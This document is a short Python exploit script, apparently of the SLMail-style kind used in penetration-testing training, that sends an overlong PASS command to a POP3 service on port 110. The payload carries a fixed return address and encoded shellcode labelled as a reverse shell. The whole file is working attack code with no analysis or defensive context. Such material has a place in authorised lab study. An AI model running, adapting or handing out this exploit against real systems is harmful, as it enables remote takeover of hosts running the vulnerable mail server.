#!/usr/bin/python3
# coding: utf-8

import sys, socket


if len(sys.argv) != 2:
  print("\nUsage: python {} <host-ip>\n".format(sys.argv[0]))
  sys.exit(1)

reverse_shell = ("\xd9\xcf\xbb\x41\x15\xfe\xc3\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x45\x31\x5a\x1a\x03\x5a\x1a\x83\xea\xfc\xe2\xb4\xe9\x16\x41"
"\x36\x12\xe7\x26\xbf\xf7\xd6\x66\xdb\x7c\x48\x57\xa8\xd1\x65"
"\x1c\xfc\xc1\xfe\x50\x28\xe5\xb7\xdf\x0e\xc8\x48\x73\x72\x4b"
"\xcb\x8e\xa6\xab\xf2\x40\xbb\xaa\x33\xbc\x31\xfe\xec\xca\xe7"
"\xef\x99\x87\x3b\x9b\xd2\x06\x3b\x78\xa2\x29\x6a\x2f\xb8\x73"
"\xac\xd1\x6d\x08\xe5\xc9\x72\x35\xbc\x62\x40\xc1\x3f\xa3\x98"
"\x2a\x93\x8a\x14\xd9\xea\xcb\x93\x02\x99\x25\xe0\xbf\x99\xf1"
"\x9a\x1b\x2c\xe2\x3d\xef\x96\xce\xbc\x3c\x40\x84\xb3\x89\x07"
"\xc2\xd7\x0c\xc4\x78\xe3\x85\xeb\xae\x65\xdd\xcf\x6a\x2d\x85"
"\x6e\x2a\x8b\x68\x8f\x2c\x74\xd4\x35\x26\x99\x01\x44\x65\xf4"
"\xd4\xdb\x13\xba\xd7\xe3\x1b\xeb\xbf\xd2\x90\x64\xc7\xeb\x72"
"\xc1\x27\x0e\x57\x3c\xc0\x96\x32\xfd\x8d\x29\xe9\xc2\xab\xa9"
"\x18\xbb\x4f\xb1\x68\xbe\x14\x76\x80\xb2\x05\x12\xa6\x61\x25"
"\x37\xd6\xea\xae\xd2\x65\x86\x38\x79\xe6\x04\x99\xc8\xb3\x8c"
"\xf1\x84\x5e\x5a\x2f\x57\xc3\xce\x4a\x04\x77\x2f\xdb\xaf\x03"
"\x01\xb4\x4a\x8e\x1e\x56\xfd\x2b\xcf\xd2\xd4\x9d\x6b\x74\x51"
"\x8c\x1f\xe5\xfc\x34\xb3\x8d\x8c\xdd\x5d\x09\x58\x39\xca\xa1"
"\xec\x35\x30\x65\x23\x87\x7d\x4b\x15\xd6\x4b\x93\x47\x29\x9a"
"\xd6\xa0\x73\xda\x28\xfe\xb3\x35\x19\xad\x9d\x39\xea\x60\xc5"
"\x90\x0c")

payload = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x83\xEC\x10" + reverse_shell + "B"*100
ipAddress = sys.argv[1]

port = 110

try:
  print("Sending 2700 bytes...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER test\r\n")
  s.recv(1024)
  s.send("PASS {}\r\n".format(payload))
  s.recv(1024)
  s.close()
except:
  print("\nConnection error...\n")
  sys.exit(0)
